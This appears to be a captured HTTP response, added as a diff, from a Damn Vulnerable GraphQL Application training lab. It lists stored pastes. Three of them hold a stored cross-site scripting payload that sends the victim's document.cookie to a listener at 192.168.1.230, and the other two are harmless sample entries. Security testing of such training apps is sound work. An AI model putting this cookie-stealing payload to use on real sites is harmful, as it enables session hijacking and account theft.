@@ -1,0 +1,7 @@
+HTTP/2 200 OK
+Content-Type: application/json
+Date: Tue, 01 Sep 2026 13:44:46 GMT
+Ngrok-Agent-Ips: X
+Content-Length: 1397
+
+{"data":{"pastes":[{"id":"15","title":"Imported Paste from File - 16bbfc","content":"<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>\r\n<mark>XSSED</mark> </br>\r\n<h1 style=\"color:red\">XSSED</h1>","ipAddr":"172.17.0.1","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0","owner":{"name":"DVGAUser"}},{"id":"14","title":"Imported Paste from File - 9cc310","content":"<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>\r\n<mark>XSSED</mark> </br>\r\n<h1 style=\"color:red\">XSSED</h1>","ipAddr":"172.17.0.1","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0","owner":{"name":"DVGAUser"}},{"id":"13","title":"Imported Paste from File - 03005c","content":"<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>\n<mark>XSSED</mark> </br>\n<h1 style=\"color:red\">XSSED</h1>\n","ipAddr":"172.17.0.1","userAgent":"Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0","owner":{"name":"DVGAUser"}},{"id":"2","title":"555-555-1337","content":"My Phone Number","ipAddr":"127.0.0.1","userAgent":"User-Agent not set","owner":{"name":"DVGAUser"}},{"id":"1","title":"Testing Testing","content":"My First Paste","ipAddr":"127.0.0.1","userAgent":"User-Agent not set","owner":{"name":"DVGAUser"}}]}}
